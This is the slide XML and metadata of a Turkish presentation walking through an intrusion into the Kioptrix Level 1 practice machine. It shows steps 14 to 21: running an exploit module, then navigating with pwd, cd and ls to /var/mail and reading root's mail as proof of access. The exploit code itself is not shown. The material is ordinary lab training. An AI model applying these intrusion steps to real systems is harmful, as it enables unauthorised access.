            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2026967" y="1354048"/>
            <a:ext cx="7430144" cy="2301439"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2026967" y="491612"/>
            <a:ext cx="4671472"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14-) ’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0" err="1">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>’ komutunu yazıp çalıştıralım</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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1083924" y="661679"/>
            <a:ext cx="9731559"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15-)Son olarak karşımıza gelen ekranda </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0" err="1">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Ctrl+C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> tuşlarına basarak mevcut işlemi iptal edelim.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Resim 4" descr="metin, ekran görüntüsü, yazı tipi içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulan içerik yanlış olabili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42607" y="1569611"/>
            <a:ext cx="7897805" cy="295043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671484" y="495610"/>
            <a:ext cx="8321633"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16-)Ctrl+C tuşlarına basınca mevcut oturumun sonlandırılıp sonlandırılmayacağını soruyor. Hayır demek için ’N’ yazalım.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Resim 3" descr="metin, yazı tipi, ekran görüntüsü içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulan içerik yanlış olabili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11013" y="1590713"/>
            <a:ext cx="5781981" cy="847686"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057067" y="2878394"/>
            <a:ext cx="7550465"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İşte şimdi an itibariyle hedef makineye sızmış bulunmaktayız.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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yazı tipi, ekran görüntüsü içeren bir resim"/>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35133" y="1646007"/>
            <a:ext cx="6321734" cy="1077421"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="924232" y="884903"/>
            <a:ext cx="10717999"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17-) ‘pwd’ komutunu yazarak hedef makinenin hangi dizininde olduğumuzu görelim</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3251517" y="1844108"/>
            <a:ext cx="5017195" cy="3985146"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1274142" y="545528"/>
            <a:ext cx="9643716"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18-) ‘cd ..’ komutunu yazıp çalıştırarak bir üst dizine çıkalım. Ardından ‘ls’ komutunu çalıştırarak dizindeki tüm klasörler ve dosyaları görelim.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2785375" y="1301795"/>
            <a:ext cx="7167921" cy="3614333"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2238703" y="401427"/>
            <a:ext cx="7714593"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19-) ‘cd /var’ diyerek var klasörünün içine giriyoruz, tekrar ‘ls’ komutunu çalıştırarak dizin içeriğini görüntülüyoruz.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3869421" y="1525077"/>
            <a:ext cx="3988389" cy="1903923"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1965071" y="406580"/>
            <a:ext cx="8394779" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>20-) ‘cd mail’ diyerek mail klasörünün içine girelim. Akabinde ‘ls’ komutunu çalıştırarak dizin içeriğini görüntüleyelim</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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834256" y="251012"/>
            <a:ext cx="8523487"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21-) ‘cat root’ komutunu çalıştırarak root isimli dosyanın içine girelim</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Resim 3" descr="metin, ekran görüntüsü, yazı tipi içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulan içerik yanlış olabili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31295" y="842993"/>
            <a:ext cx="4860653" cy="4703055"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Metin kutusu 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2071089" y="5737920"/>
            <a:ext cx="8398453"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Sızma işleminin başarılı olduğunu gösteren bir mail karşımıza çıkıyor.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502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3462105" y="2851355"/>
            <a:ext cx="5267789" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Kioptrix level1 makinesine başarıyla sızdık.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>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TM04033919[[fn=Devre]]</Template>
  <TotalTime>0</TotalTime>
  <Words>4582</Words>
  <Application>WPS Presentation</Application>
  <PresentationFormat>Geniş ekran</PresentationFormat>
  <Paragraphs>100</Paragraphs>
  <Slides>30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Arial</vt:lpstr>
      <vt:lpstr>SimSun</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Century Gothic</vt:lpstr>
      <vt:lpstr>Microsoft YaHei</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Aptos</vt:lpstr>
      <vt:lpstr>Segoe UI</vt:lpstr>
      <vt:lpstr>Communications and Dialogues</vt:lpstr>
      <vt:lpstr>Kioptrix Makinesine sızma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Alihan Dursun</dc:creator>
  <cp:lastModifiedBy>Musa</cp:lastModifiedBy>
  <cp:revision>26</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-05-06T12:14:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-10-13T19:49:20Z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8D0F8200B5704D1EB06C3436AB7DC661_12</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>1033-12.2.0.22556</vt:lpwstr>
  </property>
</Properties>
</file>